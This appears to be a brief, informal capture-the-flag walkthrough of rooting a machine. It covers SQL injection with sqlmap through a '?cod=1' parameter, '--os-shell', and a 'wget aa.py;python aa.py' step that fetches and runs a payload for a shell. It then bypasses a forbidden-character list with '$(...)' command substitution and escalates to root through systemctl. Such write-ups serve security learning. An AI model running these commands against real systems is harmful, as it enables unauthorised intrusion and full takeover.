I found literally nothong on the website except a link that says ?cod=1

i did lfi but no use .. so I did a sqlmap on it like sqlmpa -u url -p cod --dbs but cant get anything

so i put it on burp and then i did sqlmap -r rq.req --dump all

so it gave me a ton of useless info

so i tried to spawn a shell with it

sqlmap --btach -r re.req --os-shell

and got a shell now time to take shell on our machine

we did wget aa.py (with our payload);python aa.py and got a shell

now on the machine we saw a py file

forbiden=['&',';','\',"|"...]

it was protection but we do $(wget aa.py ; python aa.py) and get a shell and we got it

now we ran linpeas and it said /bi/systemctl pepper have access so we made a payload root.serve in /dev/shm

and got shell
